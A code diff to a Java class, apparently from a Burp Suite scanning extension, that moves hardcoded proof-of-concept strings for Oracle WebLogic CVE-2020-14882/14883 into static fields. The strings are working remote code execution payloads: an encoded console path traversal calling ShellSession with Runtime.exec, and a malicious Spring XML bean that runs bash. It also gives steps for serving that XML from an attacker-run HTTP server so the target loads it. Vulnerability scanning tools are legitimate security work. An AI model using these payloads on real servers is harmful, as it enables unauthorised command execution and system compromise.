@@ -12,13 +12,38 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class Weblogic {
+    public static String CVE_2020_14882_14883_1_poc = "##Condition##\n" +
+            "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0" +
+            "14883 version 12.2.1+\n\n" +
+            "##POC##\n" +
+            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")";
+    public static String CVE_2020_14882_14883_xml_poc = "##Condition##\n" +
+            "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0\n" +
+            "14883 version all\n\n" +
+            "##Evil xml##\n" +
+            "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
+            "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
+            "   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
+            "   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
+            "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
+            "        <constructor-arg>\n" +
+            "          <list>\n" +
+            "            <value>bash</value>\n" +
+            "            <value>-c</value>\n" +
+            "            <value><![CDATA[touch /tmp/success2]]></value>\n" +
+            "          </list>\n" +
+            "        </constructor-arg>\n" +
+            "    </bean>\n" +
+            "</beans>\n\n" +
+            "##Step1##\n" +
+            "start http service -> python -m http.server 8808\n\n" +
+            "##Step2##\n" +
+            "#POC#\n" +
+            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")\n" +
+            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")";
 
         public static void CVE_2020_14882_14883_1() {
-            String poc = "##Condition##\n" +
-                    "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0" +
-                    "14883 version 12.2.1+\n\n" +
-                    "##POC##\n" +
-                    "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")";
+            String poc = CVE_2020_14882_14883_1_poc;
             IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
             String val = collaboratorClientContext.generatePayload(true);
             // 据说可以覆盖所有版本
@@ -52,30 +77,7 @@ public class Weblogic {
         }
 
     public static void CVE_2020_14882_14883_xml() {
-        String poc = "##Condition##\n" +
-                "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0\n" +
-                "14883 version all\n\n" +
-                "##Evil xml##\n" +
-                "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
-                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
-                "   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
-                "   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
-                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
-                "        <constructor-arg>\n" +
-                "          <list>\n" +
-                "            <value>bash</value>\n" +
-                "            <value>-c</value>\n" +
-                "            <value><![CDATA[touch /tmp/success2]]></value>\n" +
-                "          </list>\n" +
-                "        </constructor-arg>\n" +
-                "    </bean>\n" +
-                "</beans>\n\n" +
-                "##Step1##\n" +
-                "start http service -> python -m http.server 8808\n\n" +
-                "##Step2##\n" +
-                "#POC#\n" +
-                "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")\n" +
-                "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")";
+        String poc = CVE_2020_14882_14883_xml_poc;
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
         // 据说可以覆盖所有版本
